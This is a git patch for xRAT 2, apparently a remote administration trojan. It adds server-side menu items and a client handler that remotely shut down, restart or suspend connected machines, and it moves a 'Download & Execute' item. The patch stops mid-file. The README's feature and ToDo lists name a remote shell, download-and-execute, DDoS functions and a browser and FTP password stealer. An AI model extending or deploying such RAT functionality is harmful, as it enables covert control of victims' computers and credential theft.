@@ -1,0 +1,751 @@
+From 6800dfa2133b41dd223bffc235ebdd508c50937c Mon Sep 17 00:00:00 2001
+From: MaxXor <admin@maxxor.org>
+Date: Tue, 22 Jul 2014 21:52:07 +0200
+Subject: Added Computer Commands: Restart, Shutdown, Standby
+
+Updated Readme
+
+diff --git a/Client/Client.csproj b/Client/Client.csproj
+index 43c1e13..3650ab8 100644
+--- a/Client/Client.csproj
++++ b/Client/Client.csproj
+@@ -68,6 +68,7 @@
+     <Compile Include="Core\Packets\ClientPackets\Commands\MonitorsResponse.cs" />
+     <Compile Include="Core\Packets\ClientPackets\Commands\ShellCommandResponse.cs" />
+     <Compile Include="Core\Packets\ClientPackets\Commands\UserStatus.cs" />
++    <Compile Include="Core\Packets\ServerPackets\Commands\Action.cs" />
+     <Compile Include="Core\Packets\ServerPackets\Commands\Delete.cs" />
+     <Compile Include="Core\Packets\ServerPackets\Commands\Desktop.cs" />
+     <Compile Include="Core\Packets\ServerPackets\Commands\Directory.cs" />
+diff --git a/Client/Core/Commands/CommandHandler.cs b/Client/Core/Commands/CommandHandler.cs
+index 0003d4a..93db2e3 100644
+--- a/Client/Core/Commands/CommandHandler.cs
++++ b/Client/Core/Commands/CommandHandler.cs
+@@ -519,5 +519,39 @@ public static void HandleDelete(Core.Packets.ServerPackets.Delete command, Core.
+ 			catch
+ 			{ }
+ 		}
++
++		public static void HandleAction(Core.Packets.ServerPackets.Action command, Core.Client client)
++		{
++			try
++			{
++				ProcessStartInfo startInfo = new ProcessStartInfo();
++				switch(command.Mode)
++				{
++					case 0:
++						startInfo.WindowStyle = ProcessWindowStyle.Hidden;
++						startInfo.CreateNoWindow = true;
++						startInfo.UseShellExecute = true;
++						startInfo.Arguments = "/s /t 0"; // shutdown
++						startInfo.FileName = "shutdown";
++						Process.Start(startInfo);
++						break;
++					case 1:
++						startInfo.WindowStyle = ProcessWindowStyle.Hidden;
++						startInfo.CreateNoWindow = true;
++						startInfo.UseShellExecute = true;
++						startInfo.Arguments = "/r /t 0"; // restart
++						startInfo.FileName = "shutdown";
++						Process.Start(startInfo);
++						break;
++					case 2:
++						Application.SetSuspendState(PowerState.Suspend, true, true); // standby
++						break;
++				}
++			}
++			catch
++			{
++				new Core.Packets.ClientPackets.Status("Action failed!").Execute(client);
++			}
++		}
+ 	}
+ }
+diff --git a/Client/Core/Packets/ServerPackets/Commands/Action.cs b/Client/Core/Packets/ServerPackets/Commands/Action.cs
+new file mode 100644
+index 0000000..2cc83bb
+--- /dev/null
++++ b/Client/Core/Packets/ServerPackets/Commands/Action.cs
+@@ -0,0 +1,22 @@
++﻿using ProtoBuf;
++
++namespace Core.Packets.ServerPackets
++{
++    [ProtoContract]
++    public class Action : IPacket
++    {
++        [ProtoMember(1)]
++        public int Mode { get; set; }
++
++        public Action() { }
++        public Action(int mode)
++        {
++            this.Mode = mode;
++        }
++
++        public void Execute(Client client)
++        {
++            client.Send<Action>(this);
++        }
++    }
++}
+diff --git a/Client/Program.cs b/Client/Program.cs
+index 4fe9381..cc767a1 100644
+--- a/Client/Program.cs
++++ b/Client/Program.cs
+@@ -84,6 +84,7 @@ static void Initialize()
+                 typeof(Core.Packets.ServerPackets.ShellCommand),
+                 typeof(Core.Packets.ServerPackets.Rename),
+                 typeof(Core.Packets.ServerPackets.Delete),
++                typeof(Core.Packets.ServerPackets.Action),
+                 typeof(Core.Packets.ClientPackets.Initialize),
+                 typeof(Core.Packets.ClientPackets.Status),
+                 typeof(Core.Packets.ClientPackets.UserStatus),
+@@ -246,5 +247,9 @@ static void ClientRead(Core.Client client, IPacket packet)
+         {
+             CommandHandler.HandleDelete((Core.Packets.ServerPackets.Delete)packet, client);
+         }
++        else if (type == typeof(Core.Packets.ServerPackets.Action))
++        {
++            CommandHandler.HandleAction((Core.Packets.ServerPackets.Action)packet, client);
++        }
+     }
+ }
+diff --git a/README.md b/README.md
+index 982b649..9bf202e 100644
+--- a/README.md
++++ b/README.md
+@@ -19,10 +19,10 @@ Features
+ * Remote Desktop
+ * Download & Execute
+ * System Information
++* Computer Commands (Restart, Shutdown, Standby)
+ 
+ ToDo
+ ---
+-* Computer Commands (Restart, Shutdown, Standby)
+ * DDoS Functions
+ * Enable/Disable Keyboard and Mouse
+ * Password Stealer (Browsers, FTP-Clients)
+diff --git a/Server/Core/Packets/ServerPackets/Commands/Action.cs b/Server/Core/Packets/ServerPackets/Commands/Action.cs
+new file mode 100644
+index 0000000..2cc83bb
+--- /dev/null
++++ b/Server/Core/Packets/ServerPackets/Commands/Action.cs
+@@ -0,0 +1,22 @@
++﻿using ProtoBuf;
++
++namespace Core.Packets.ServerPackets
++{
++    [ProtoContract]
++    public class Action : IPacket
++    {
++        [ProtoMember(1)]
++        public int Mode { get; set; }
++
++        public Action() { }
++        public Action(int mode)
++        {
++            this.Mode = mode;
++        }
++
++        public void Execute(Client client)
++        {
++            client.Send<Action>(this);
++        }
++    }
++}
+diff --git a/Server/Forms/frmMain.Designer.cs b/Server/Forms/frmMain.Designer.cs
+index 9c4b132..ab259ea 100644
+--- a/Server/Forms/frmMain.Designer.cs
++++ b/Server/Forms/frmMain.Designer.cs
+@@ -38,14 +38,19 @@ private void InitializeComponent()
+             this.ctxtUninstall = new System.Windows.Forms.ToolStripMenuItem();
+             this.ctxtSystem = new System.Windows.Forms.ToolStripMenuItem();
+             this.ctxtSystemInformation = new System.Windows.Forms.ToolStripMenuItem();
+-            this.ctxtDownloadAndExecute = new System.Windows.Forms.ToolStripMenuItem();
+             this.ctxtTaskManager = new System.Windows.Forms.ToolStripMenuItem();
+             this.ctxtFileManager = new System.Windows.Forms.ToolStripMenuItem();
+             this.ctxtPasswordRecovery = new System.Windows.Forms.ToolStripMenuItem();
+             this.ctxtRemoteShell = new System.Windows.Forms.ToolStripMenuItem();
++            this.ctxtLine = new System.Windows.Forms.ToolStripSeparator();
++            this.ctxtActions = new System.Windows.Forms.ToolStripMenuItem();
++            this.ctxtShutdown = new System.Windows.Forms.ToolStripMenuItem();
++            this.ctxtRestart = new System.Windows.Forms.ToolStripMenuItem();
++            this.ctxtStandby = new System.Windows.Forms.ToolStripMenuItem();
+             this.ctxtSurveillance = new System.Windows.Forms.ToolStripMenuItem();
+             this.ctxtRemoteDesktop = new System.Windows.Forms.ToolStripMenuItem();
+             this.ctxtMiscellaneous = new System.Windows.Forms.ToolStripMenuItem();
++            this.ctxtDownloadAndExecute = new System.Windows.Forms.ToolStripMenuItem();
+             this.ctxtVisitWebsite = new System.Windows.Forms.ToolStripMenuItem();
+             this.ctxtShowMessagebox = new System.Windows.Forms.ToolStripMenuItem();
+             this.botStrip = new System.Windows.Forms.StatusStrip();
+@@ -80,7 +85,7 @@ private void InitializeComponent()
+             this.ctxtSurveillance,
+             this.ctxtMiscellaneous});
+             this.ctxtMenu.Name = "ctxtMenu";
+-            this.ctxtMenu.Size = new System.Drawing.Size(150, 92);
++            this.ctxtMenu.Size = new System.Drawing.Size(153, 114);
+             // 
+             // ctxtConnection
+             // 
+@@ -91,7 +96,7 @@ private void InitializeComponent()
+             this.ctxtUninstall});
+             this.ctxtConnection.Image = ((System.Drawing.Image)(resources.GetObject("ctxtConnection.Image")));
+             this.ctxtConnection.Name = "ctxtConnection";
+-            this.ctxtConnection.Size = new System.Drawing.Size(149, 22);
++            this.ctxtConnection.Size = new System.Drawing.Size(152, 22);
+             this.ctxtConnection.Text = "Connection";
+             // 
+             // ctxtUpdate
+@@ -130,37 +135,30 @@ private void InitializeComponent()
+             // 
+             this.ctxtSystem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+             this.ctxtSystemInformation,
+-            this.ctxtDownloadAndExecute,
+             this.ctxtTaskManager,
+             this.ctxtFileManager,
+             this.ctxtPasswordRecovery,
+-            this.ctxtRemoteShell});
++            this.ctxtRemoteShell,
++            this.ctxtLine,
++            this.ctxtActions});
+             this.ctxtSystem.Image = ((System.Drawing.Image)(resources.GetObject("ctxtSystem.Image")));
+             this.ctxtSystem.Name = "ctxtSystem";
+-            this.ctxtSystem.Size = new System.Drawing.Size(149, 22);
++            this.ctxtSystem.Size = new System.Drawing.Size(152, 22);
+             this.ctxtSystem.Text = "System";
+             // 
+             // ctxtSystemInformation
+             // 
+             this.ctxtSystemInformation.Image = ((System.Drawing.Image)(resources.GetObject("ctxtSystemInformation.Image")));
+             this.ctxtSystemInformation.Name = "ctxtSystemInformation";
+-            this.ctxtSystemInformation.Size = new System.Drawing.Size(184, 22);
++            this.ctxtSystemInformation.Size = new System.Drawing.Size(178, 22);
+             this.ctxtSystemInformation.Text = "System Information";
+             this.ctxtSystemInformation.Click += new System.EventHandler(this.ctxtSystemInformation_Click);
+             // 
+-            // ctxtDownloadAndExecute
+-            // 
+-            this.ctxtDownloadAndExecute.Image = ((System.Drawing.Image)(resources.GetObject("ctxtDownloadAndExecute.Image")));
+-            this.ctxtDownloadAndExecute.Name = "ctxtDownloadAndExecute";
+-            this.ctxtDownloadAndExecute.Size = new System.Drawing.Size(184, 22);
+-            this.ctxtDownloadAndExecute.Text = "Download && Execute";
+-            this.ctxtDownloadAndExecute.Click += new System.EventHandler(this.ctxtDownloadAndExecute_Click);
+-            // 
+             // ctxtTaskManager
+             // 
+             this.ctxtTaskManager.Image = ((System.Drawing.Image)(resources.GetObject("ctxtTaskManager.Image")));
+             this.ctxtTaskManager.Name = "ctxtTaskManager";
+-            this.ctxtTaskManager.Size = new System.Drawing.Size(184, 22);
++            this.ctxtTaskManager.Size = new System.Drawing.Size(178, 22);
+             this.ctxtTaskManager.Text = "Task Manager";
+             this.ctxtTaskManager.Click += new System.EventHandler(this.ctxtTaskManager_Click);
+             // 
+@@ -168,7 +166,7 @@ private void InitializeComponent()
+             // 
+             this.ctxtFileManager.Image = ((System.Drawing.Image)(resources.GetObject("ctxtFileManager.Image")));
+             this.ctxtFileManager.Name = "ctxtFileManager";
+-            this.ctxtFileManager.Size = new System.Drawing.Size(184, 22);
++            this.ctxtFileManager.Size = new System.Drawing.Size(178, 22);
+             this.ctxtFileManager.Text = "File Manager";
+             this.ctxtFileManager.Click += new System.EventHandler(this.ctxtFileManager_Click);
+             // 
+@@ -177,7 +175,7 @@ private void InitializeComponent()
+             this.ctxtPasswordRecovery.Enabled = false;
+             this.ctxtPasswordRecovery.Image = ((System.Drawing.Image)(resources.GetObject("ctxtPasswordRecovery.Image")));
+             this.ctxtPasswordRecovery.Name = "ctxtPasswordRecovery";
+-            this.ctxtPasswordRecovery.Size = new System.Drawing.Size(184, 22);
++            this.ctxtPasswordRecovery.Size = new System.Drawing.Size(178, 22);
+             this.ctxtPasswordRecovery.Text = "Password Recovery";
+             this.ctxtPasswordRecovery.Click += new System.EventHandler(this.ctxtPasswordRecovery_Click);
+             // 
+@@ -185,17 +183,57 @@ private void InitializeComponent()
+             // 
+             this.ctxtRemoteShell.Image = ((System.Drawing.Image)(resources.GetObject("ctxtRemoteShell.Image")));
+             this.ctxtRemoteShell.Name = "ctxtRemoteShell";
+-            this.ctxtRemoteShell.Size = new System.Drawing.Size(184, 22);
++            this.ctxtRemoteShell.Size = new System.Drawing.Size(178, 22);
+             this.ctxtRemoteShell.Text = "Remote Shell";
+             this.ctxtRemoteShell.Click += new System.EventHandler(this.ctxtRemoteShell_Click);
+             // 
++            // ctxtLine
++            // 
++            this.ctxtLine.Name = "ctxtLine";
++            this.ctxtLine.Size = new System.Drawing.Size(175, 6);
++            // 
++            // ctxtActions
++            // 
++            this.ctxtActions.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
++            this.ctxtShutdown,
++            this.ctxtRestart,
++            this.ctxtStandby});
++            this.ctxtActions.Image = global::xRAT_2.Properties.Resources.actions;
++            this.ctxtActions.Name = "ctxtActions";
++            this.ctxtActions.Size = new System.Drawing.Size(178, 22);
++            this.ctxtActions.Text = "Actions";
++            // 
++            // ctxtShutdown
++            // 
++            this.ctxtShutdown.Image = global::xRAT_2.Properties.Resources.shutdown;
++            this.ctxtShutdown.Name = "ctxtShutdown";
++            this.ctxtShutdown.Size = new System.Drawing.Size(152, 22);
++            this.ctxtShutdown.Text = "Shutdown";
++            this.ctxtShutdown.Click += new System.EventHandler(this.ctxtShutdown_Click);
++            // 
++            // ctxtRestart
++            // 
++            this.ctxtRestart.Image = global::xRAT_2.Properties.Resources.restart;
++            this.ctxtRestart.Name = "ctxtRestart";
++            this.ctxtRestart.Size = new System.Drawing.Size(152, 22);
++            this.ctxtRestart.Text = "Restart";
++            this.ctxtRestart.Click += new System.EventHandler(this.ctxtRestart_Click);
++            // 
++            // ctxtStandby
++            // 
++            this.ctxtStandby.Image = global::xRAT_2.Properties.Resources.standby;
++            this.ctxtStandby.Name = "ctxtStandby";
++            this.ctxtStandby.Size = new System.Drawing.Size(152, 22);
++            this.ctxtStandby.Text = "Standby";
++            this.ctxtStandby.Click += new System.EventHandler(this.ctxtStandby_Click);
++            // 
+             // ctxtSurveillance
+             // 
+             this.ctxtSurveillance.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+             this.ctxtRemoteDesktop});
+             this.ctxtSurveillance.Image = ((System.Drawing.Image)(resources.GetObject("ctxtSurveillance.Image")));
+             this.ctxtSurveillance.Name = "ctxtSurveillance";
+-            this.ctxtSurveillance.Size = new System.Drawing.Size(149, 22);
++            this.ctxtSurveillance.Size = new System.Drawing.Size(152, 22);
+             this.ctxtSurveillance.Text = "Surveillance";
+             // 
+             // ctxtRemoteDesktop
+@@ -209,18 +247,27 @@ private void InitializeComponent()
+             // ctxtMiscellaneous
+             // 
+             this.ctxtMiscellaneous.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
++            this.ctxtDownloadAndExecute,
+             this.ctxtVisitWebsite,
+             this.ctxtShowMessagebox});
+             this.ctxtMiscellaneous.Image = ((System.Drawing.Image)(resources.GetObject("ctxtMiscellaneous.Image")));
+             this.ctxtMiscellaneous.Name = "ctxtMiscellaneous";
+-            this.ctxtMiscellaneous.Size = new System.Drawing.Size(149, 22);
++            this.ctxtMiscellaneous.Size = new System.Drawing.Size(152, 22);
+             this.ctxtMiscellaneous.Text = "Miscellaneous";
+             // 
++            // ctxtDownloadAndExecute
++            // 
++            this.ctxtDownloadAndExecute.Image = ((System.Drawing.Image)(resources.GetObject("ctxtDownloadAndExecute.Image")));
++            this.ctxtDownloadAndExecute.Name = "ctxtDownloadAndExecute";
++            this.ctxtDownloadAndExecute.Size = new System.Drawing.Size(184, 22);
++            this.ctxtDownloadAndExecute.Text = "Download && Execute";
++            this.ctxtDownloadAndExecute.Click += new System.EventHandler(this.ctxtDownloadAndExecute_Click);
++            // 
+             // ctxtVisitWebsite
+             // 
+             this.ctxtVisitWebsite.Image = ((System.Drawing.Image)(resources.GetObject("ctxtVisitWebsite.Image")));
+             this.ctxtVisitWebsite.Name = "ctxtVisitWebsite";
+-            this.ctxtVisitWebsite.Size = new System.Drawing.Size(171, 22);
++            this.ctxtVisitWebsite.Size = new System.Drawing.Size(184, 22);
+             this.ctxtVisitWebsite.Text = "Visit Website";
+             this.ctxtVisitWebsite.Click += new System.EventHandler(this.ctxtVisitWebsite_Click);
+             // 
+@@ -228,7 +275,7 @@ private void InitializeComponent()
+             // 
+             this.ctxtShowMessagebox.Image = ((System.Drawing.Image)(resources.GetObject("ctxtShowMessagebox.Image")));
+             this.ctxtShowMessagebox.Name = "ctxtShowMessagebox";
+-            this.ctxtShowMessagebox.Size = new System.Drawing.Size(171, 22);
++            this.ctxtShowMessagebox.Size = new System.Drawing.Size(184, 22);
+             this.ctxtShowMessagebox.Text = "Show Messagebox";
+             this.ctxtShowMessagebox.Click += new System.EventHandler(this.ctxtShowMessagebox_Click);
+             // 
+@@ -628,7 +675,6 @@ private void InitializeComponent()
+             this.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+             this.ForeColor = System.Drawing.Color.Black;
+             this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+-            this.Menu = this.mainMenu;
+             this.MinimumSize = new System.Drawing.Size(680, 415);
+             this.Name = "frmMain";
+             this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+@@ -683,6 +729,11 @@ private void InitializeComponent()
+         private System.Windows.Forms.ToolStripMenuItem ctxtRemoteShell;
+         public Controls.ListViewEx lstClients;
+         public System.Windows.Forms.NotifyIcon nIcon;
++        private System.Windows.Forms.ToolStripSeparator ctxtLine;
++        private System.Windows.Forms.ToolStripMenuItem ctxtActions;
++        private System.Windows.Forms.ToolStripMenuItem ctxtShutdown;
++        private System.Windows.Forms.ToolStripMenuItem ctxtRestart;
++        private System.Windows.Forms.ToolStripMenuItem ctxtStandby;
+     }
+ }
+ 
+diff --git a/Server/Forms/frmMain.cs b/Server/Forms/frmMain.cs
+index 58a4764..d44e8fd 100644
+--- a/Server/Forms/frmMain.cs
++++ b/Server/Forms/frmMain.cs
+@@ -92,6 +92,7 @@ private void frmMain_Load(object sender, EventArgs e)
+                 typeof(Core.Packets.ServerPackets.ShellCommand),
+                 typeof(Core.Packets.ServerPackets.Rename),
+                 typeof(Core.Packets.ServerPackets.Delete),
++                typeof(Core.Packets.ServerPackets.Action),
+                 typeof(Core.Packets.ClientPackets.Initialize),
+                 typeof(Core.Packets.ClientPackets.Status),
+                 typeof(Core.Packets.ClientPackets.UserStatus),
+@@ -370,8 +371,44 @@ private void ctxtRemoteShell_Click(object sender, EventArgs e)
+                     frmRS.Show();
+                 }
+             }
+-            #endregion
+             
++            private void ctxtShutdown_Click(object sender, EventArgs e)
++            {
++                if (lstClients.SelectedItems.Count != 0)
++                {
++                    foreach (ListViewItem lvi in lstClients.SelectedItems)
++                    {
++                        Client c = (Client)lvi.Tag;
++                        new Core.Packets.ServerPackets.Action(0).Execute(c);
++                    }
++                }
++            }
++            
++            private void ctxtRestart_Click(object sender, EventArgs e)
++            {
++                if (lstClients.SelectedItems.Count != 0)
++                {
++                    foreach (ListViewItem lvi in lstClients.SelectedItems)
++                    {
++                        Client c = (Client)lvi.Tag;
++                        new Core.Packets.ServerPackets.Action(1).Execute(c);
++                    }
++                }
++            }
++            
++            private void ctxtStandby_Click(object sender, EventArgs e)
++            {
++                if (lstClients.SelectedItems.Count != 0)
++                {
++                    foreach (ListViewItem lvi in lstClients.SelectedItems)
++                    {
++                        Client c = (Client)lvi.Tag;
++                        new Core.Packets.ServerPackets.Action(2).Execute(c);
++                    }
++                }
++            }
++            #endregion
++
+             #region "Surveillance"
+             private void ctxtRemoteDesktop_Click(object sender, EventArgs e)
+             {
+diff --git a/Server/Forms/frmMain.resx b/Server/Forms/frmMain.resx
+index 8a89f5f..b97a2be 100644
+--- a/Server/Forms/frmMain.resx
++++ b/Server/Forms/frmMain.resx
+@@ -223,27 +223,6 @@
+         ofiDvAMF+oRo0AP9zAqEWifZ8iOcbTSjRmWD2hSAsI8BzWlIEPH+g5Q2KdTzqILu2Mkbk1BOLeGekyWs
+         ocMcRH6dERSnMUZzm/58lH9Cn1BnUbxOEZWvYCluc5ziNMVJRZYgOsht+Ptl+neQ8R04hsvsalKMmgAA
+         AABJRU5ErkJggg==
+-</value>
+-  </data>
+-  <data name="ctxtDownloadAndExecute.Image" type="System.Drawing.Bitmap, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
+-    <value>
+-        iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8
+-        YQUAAAN1SURBVDhPVZJ/TNRlHMffx32POw6+xx3ccRxwIMfvOzl+KYZXB+hq2vzFIfKbCxAP4oTNnJhp
+-        UqBFNNQC+oPmiGpmSxMcyYw0h1ttLudi5tbKPypWW82trNUfrncfmit9tvezZ8+e9+v5fJ73g+RR80Ny
+-        vG6C7YQR/tFVZsexGINuCoZ1V7yWmAodLFujEF8dDesDQvqoHStOiI4lIE3kHLEiYVjNbVuoP1d5sXQ8
+-        70rSeN2tdR/CBZe2OAL6RxToy0RrRT4FKF/ywvf1SpQtulF2Iw+l17Ox8pqzZfDm83zmqzA33PYx/FMd
+-        UYFqQ0CD6DoFaoMOaosOpvZI/Dsev12MiusF8H8msAU3Ci45u6aWJjn243EG/6ri4XthohLN+hoBNAmg
+-        Vcxd980wAd6aHBRdc6HwsgueuVSknDN1zt45z/d/P8UeBjnBYaJcANuBGAGY2hVo0zVAhPg1iUBhWy4K
+-        d3iQeEYe5m09tGMIXb77CWf/nubLPMCr/Jh4FA1KADA2auBojIM2UwDLRWiSBNCZi6I2D3ICWYgckM09
+-        2Pnpr5d4gTMcF8Qt3iB8qEUV4AzaYW80Q5sl5/QiOKSFUDa87TnIqF2BxE1WYA02X7jzEc/yPR5lHxfu
+-        zRP5qLRttSCxPg7WWhUal3glBCAeyGtz7c5qSjuZsCV+wLhe1900UjM/e3eGE3+McRd3cJKv0RKIPm/0
+-        GUKmJ4yH1Y2GN+TiXnFHQN2oR8dc4J3pb8/yg5tnOPXDJN/65SRHvh/iC0sHGPi5krvZzCNSyRD380X2
+-        cu+fQbr7Ut5VSuQdLE8aZQJWDXkmnj3dxz3TPWy/2szWL+rZ9mU9/YtebvruMdb9toGtrOLmRT+jejCB
+-        ZOmgWADWLSqQIsVInDkH04a3H9/G9W/6uHamkKXzucyeT2DJ55n0f+Nl+cUCKkG8CvnBuswI6EokR9u2
+-        WESkC0DiLDrqhrPHNrj6OS+thwyMGgPVU6B9LpL5p1NpaMCg2qsVkwTgVhC5enldFQtthpQicZa+ko+M
+-        vcmwh2L7k3aZiadA5SCYPKIyqknTb+qIhHmfhC/JGTy6+4DA/4A1wwXI2ueEo9uyDDmUFrLS0WViTIvS
+-        H9OhwNKth6VPwpez/wESqh8GZPelIikch8QuM2xPGwdidyovqfJ11U4BhA2w7H8QoMU/kgcrEJiH21AA
+-        AAAASUVORK5CYII=
+ </value>
+   </data>
+   <data name="ctxtTaskManager.Image" type="System.Drawing.Bitmap, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
+@@ -359,6 +338,27 @@
+         vFXvHu0qboy1gTO+AGdTgXVqwDg0YOcIUPqXoPpuY1F5o2Tqeer/0Fh7XNqDvQYVubvlJwzK+qvjj+tG
+         Jp/UcSZF3Q+L4vrOTOu1/Pv7VxY0d2rl2luXLh70HGrwLzoy+eeC7DdDjRpyPiqHagAAAABJRU5ErkJg
+         gg==
++</value>
++  </data>
++  <data name="ctxtDownloadAndExecute.Image" type="System.Drawing.Bitmap, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
++    <value>
++        iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8
++        YQUAAAN1SURBVDhPVZJ/TNRlHMffx32POw6+xx3ccRxwIMfvOzl+KYZXB+hq2vzFIfKbCxAP4oTNnJhp
++        UqBFNNQC+oPmiGpmSxMcyYw0h1ttLudi5tbKPypWW82trNUfrncfmit9tvezZ8+e9+v5fJ73g+RR80Ny
++        vG6C7YQR/tFVZsexGINuCoZ1V7yWmAodLFujEF8dDesDQvqoHStOiI4lIE3kHLEiYVjNbVuoP1d5sXQ8
++        70rSeN2tdR/CBZe2OAL6RxToy0RrRT4FKF/ywvf1SpQtulF2Iw+l17Ox8pqzZfDm83zmqzA33PYx/FMd
++        UYFqQ0CD6DoFaoMOaosOpvZI/Dsev12MiusF8H8msAU3Ci45u6aWJjn243EG/6ri4XthohLN+hoBNAmg
++        Vcxd980wAd6aHBRdc6HwsgueuVSknDN1zt45z/d/P8UeBjnBYaJcANuBGAGY2hVo0zVAhPg1iUBhWy4K
++        d3iQeEYe5m09tGMIXb77CWf/nubLPMCr/Jh4FA1KADA2auBojIM2UwDLRWiSBNCZi6I2D3ICWYgckM09
++        2Pnpr5d4gTMcF8Qt3iB8qEUV4AzaYW80Q5sl5/QiOKSFUDa87TnIqF2BxE1WYA02X7jzEc/yPR5lHxfu
++        zRP5qLRttSCxPg7WWhUal3glBCAeyGtz7c5qSjuZsCV+wLhe1900UjM/e3eGE3+McRd3cJKv0RKIPm/0
++        GUKmJ4yH1Y2GN+TiXnFHQN2oR8dc4J3pb8/yg5tnOPXDJN/65SRHvh/iC0sHGPi5krvZzCNSyRD380X2
++        cu+fQbr7Ut5VSuQdLE8aZQJWDXkmnj3dxz3TPWy/2szWL+rZ9mU9/YtebvruMdb9toGtrOLmRT+jejCB
++        ZOmgWADWLSqQIsVInDkH04a3H9/G9W/6uHamkKXzucyeT2DJ55n0f+Nl+cUCKkG8CvnBuswI6EokR9u2
++        WESkC0DiLDrqhrPHNrj6OS+thwyMGgPVU6B9LpL5p1NpaMCg2qsVkwTgVhC5enldFQtthpQicZa+ko+M
++        vcmwh2L7k3aZiadA5SCYPKIyqknTb+qIhHmfhC/JGTy6+4DA/4A1wwXI2ueEo9uyDDmUFrLS0WViTIvS
++        H9OhwNKth6VPwpez/wESqh8GZPelIikch8QuM2xPGwdidyovqfJ11U4BhA2w7H8QoMU/kgcrEJiH21AA
++        AAAASUVORK5CYII=
+ </value>
+   </data>
+   <data name="ctxtVisitWebsite.Image" type="System.Drawing.Bitmap, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
+@@ -429,7 +429,7 @@
+         AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj0yLjAuMC4w
+         LCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACZTeXN0
+         ZW0uV2luZG93cy5Gb3Jtcy5JbWFnZUxpc3RTdHJlYW1lcgEAAAAERGF0YQcCAgAAAAkDAAAADwMAAADY
+-        sQAAAk1TRnQBSQFMAgEB+AEAAXABBgFwAQYBEAEAAQsBAAT/AQkBAAj/AUIBTQE2AQQGAAE2AQQCAAEo
++        sQAAAk1TRnQBSQFMAgEB+AEAAZgBBgGYAQYBEAEAAQsBAAT/AQkBAAj/AUIBTQE2AQQGAAE2AQQCAAEo
+         AwABQAMAAbUBAgIAAQEBAAEIBQABQAGtGAABgAIAAYADAAKAAQABgAMAAYABAAGAAQACgAIAA8ABAAHA
+         AdwBwAEAAfABygGmAQABMwUAATMBAAEzAQABMwEAAjMCAAMWAQADHAEAAyIBAAMpAQADVQEAA00BAANC
+         AQADOQEAAYABfAH/AQACUAH/AQABkwEAAdYBAAH/AewBzAEAAcYB1gHvAQAB1gLnAQABkAGpAa0CAAH/
+diff --git a/Server/Properties/Resources.Designer.cs b/Server/Properties/Resources.Designer.cs
+index eb6ed5d..eeca964 100644
+--- a/Server/Properties/Resources.Designer.cs
++++ b/Server/Properties/Resources.Designer.cs
+@@ -60,6 +60,16 @@ internal class Resources {
+             }
+         }
+         
++        /// <summary>
++        ///   Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
++        /// </summary>
++        internal static System.Drawing.Bitmap actions {
++            get {
++                object obj = ResourceManager.GetObject("actions", resourceCulture);
++                return ((System.Drawing.Bitmap)(obj));
++            }
++        }
++        
+         /// <summary>
+         ///   Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+         /// </summary>
+@@ -200,6 +210,16 @@ internal class Resources {
+             }
+         }
+         
++        /// <summary>
++        ///   Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
++        /// </summary>
++        internal static System.Drawing.Bitmap restart {
++            get {
++                object obj = ResourceManager.GetObject("restart", resourceCulture);
++                return ((System.Drawing.Bitmap)(obj));
++            }
++        }
++        
+         /// <summary>
+         ///   Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+         /// </summary>
+@@ -260,6 +280,26 @@ internal class Resources {
+             }
+         }
+         
++        /// <summary>
++        ///   Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
++        /// </summary>
++        internal static System.Drawing.Bitmap shutdown {
++            get {
++                object obj = ResourceManager.GetObject("shutdown", resourceCulture);
++                return ((System.Drawing.Bitmap)(obj));
++            }
++        }
++        
++        /// <summary>
++        ///   Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
++        /// </summary>
++        internal static System.Drawing.Bitmap standby {
++            get {
++                object obj = ResourceManager.GetObject("standby", resourceCulture);
++                return ((System.Drawing.Bitmap)(obj));
++            }
++        }
++        
+         /// <summary>
+         ///   Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+         /// </summary>
+diff --git a/Server/Properties/Resources.resx b/Server/Properties/Resources.resx
+index 307011c..643a948 100644
+--- a/Server/Properties/Resources.resx
++++ b/Server/Properties/Resources.resx
+@@ -117,42 +117,42 @@
+   <resheader name="writer">
+     <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+   </resheader>
+-  <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+-  <data name="server-reconnect" type="System.Resources.ResXFileRef, System.Windows.Forms">
+-    <value>..\images\server-reconnect.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+-  </data>
+-  <data name="delete" type="System.Resources.ResXFileRef, System.Windows.Forms">
+-    <value>..\Resources\delete.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+-  </data>
+-  <data name="server" type="System.Resources.ResXFileRef, System.Windows.Forms">
